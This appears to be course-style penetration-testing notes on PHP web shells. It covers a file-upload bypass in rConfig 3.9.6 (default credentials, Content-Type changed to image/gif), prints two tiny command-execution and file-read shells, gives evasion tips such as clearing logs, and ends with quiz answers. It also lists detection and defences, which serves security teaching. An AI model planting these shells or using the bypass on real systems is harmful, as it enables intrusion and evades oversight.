# PHP Web Shells

## Overview

**PHP (Hypertext Preprocessor)** is an open-source general-purpose scripting language typically used as part of a web stack that powers websites. As of October 2021, PHP is the most popular server-side programming language, used by 78.6% of all websites whose server-side programming language is known (W3Techs survey).

## Why PHP Web Shells Matter

Since PHP processes code and commands on the server-side, we can use pre-written payloads to:
- Gain a shell through the browser
- Initiate a reverse shell session with our attack box
- Execute commands on the underlying operating system

## Practical Example: rConfig Exploitation

### Target: rConfig 3.9.6 Vulnerability

rConfig is a PHP-based network configuration management tool that contains a file upload vulnerability.

### Attack Vector: Vendor Logo Upload

1. **Access Point**: Navigate to `Devices > Vendors > Add Vendor`
2. **Default Credentials**: admin:admin
3. **Upload Location**: Vendor Logo browse button
4. **File Type Restriction**: Only allows image files (.png, .jpg, .gif, etc.)

### Bypassing File Type Restrictions

#### Tools Required:
- Burp Suite
- PHP web shell payload (e.g., WhiteWinterWolf's PHP Web Shell)

#### Proxy Configuration:
```
IP Address: 127.0.0.1
Port: 8080
```

#### Step-by-Step Process:

1. **Configure Burp Suite**:
   - Start Burp Suite
   - Configure browser proxy settings to route through Burp
   - Accept PortSwigger Certificate if prompted

2. **Upload PHP Shell**:
   - Browse to .php file location
   - Select file and click Save
   - Burp will intercept the request

3. **Modify Content-Type**:
   - Locate the POST request containing file upload
   - Change `Content-type` from `application/x-php` to `image/gif`
   - Forward the request twice

4. **Access Web Shell**:
   - Navigate to: `/images/vendor/connect.php`
   - Execute commands through the browser interface

### Example POST Request Structure:
```http
POST /devices/vendors/add HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="logo"; filename="connect.php"
Content-Type: image/gif

<?php
// PHP web shell code here
?>
------WebKitFormBoundary...
```

## Web Shell Capabilities

Once successfully uploaded and accessed, PHP web shells provide:

- **Command Execution**: Execute system commands
- **File System Access**: Navigate, read, write files
- **Network Operations**: Download/upload files
- **System Information**: Gather OS and application details

## Security Considerations

### Limitations:
- **File Deletion**: Web applications may automatically delete files after pre-defined periods
- **Limited Interactivity**: Restricted OS navigation and file operations
- **Command Chaining**: May not support complex command chains (e.g., `whoami && hostname`)
- **Instability**: Non-interactive shells can be unreliable
- **Detection Risk**: Higher chance of leaving evidence

### Best Practices:

1. **Stealth Operations**:
   - Establish reverse shell quickly
   - Delete payload after successful execution
   - Cover tracks to avoid detection

2. **Documentation**:
   - Record all attempted methods
   - Note successful and failed attempts
   - Document payload names and file locations
   - Include SHA1 or MD5 hashes for verification

3. **Evasion Techniques**:
   - Remove author comments from payloads
   - Use legitimate-looking file names
   - Employ proper cleanup procedures

## Common PHP Web Shell Examples

### Simple Command Execution:
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### File Upload/Download:
```php
<?php
if(isset($_POST['file'])) {
    $file = $_POST['file'];
    if(file_exists($file)) {
        readfile($file);
    }
}
?>
```

### Advanced Features:
- File manager interface
- Database connections
- Process management
- Network scanning capabilities

## Detection and Mitigation

### Common Indicators:
- Unusual file uploads to web directories
- Suspicious POST requests to image files
- Unexpected PHP execution in upload directories
- Abnormal outbound network connections

### Defensive Measures:
- Implement proper file type validation
- Use whitelist approach for file extensions
- Scan uploaded files for malicious content
- Restrict execution permissions in upload directories
- Monitor web server logs for suspicious activity

## Engagement Considerations

### Black Box Assessments:
- Emulate real attacker behavior
- Test client detection capabilities
- Operate stealthily when required
- Document all activities thoroughly

### Cleanup Procedures:
- Remove uploaded shells after testing
- Clear log entries if possible
- Provide detailed remediation steps
- Include attribution in reports

## Key Questions for Assessment

1. **Content-Type Bypass**: What Content-Type value allows successful PHP upload?
   - Answer: `image/gif`

2. **File Location**: Where are vendor logos stored?
   - Path: `/images/vendor/`

3. **Default Credentials**: What are rConfig default login credentials?
   - Username: admin
   - Password: admin

## References

- W3Techs PHP Usage Statistics
- WhiteWinterWolf's PHP Web Shell
- rConfig Security Advisories
- OWASP Web Shell Detection Guide 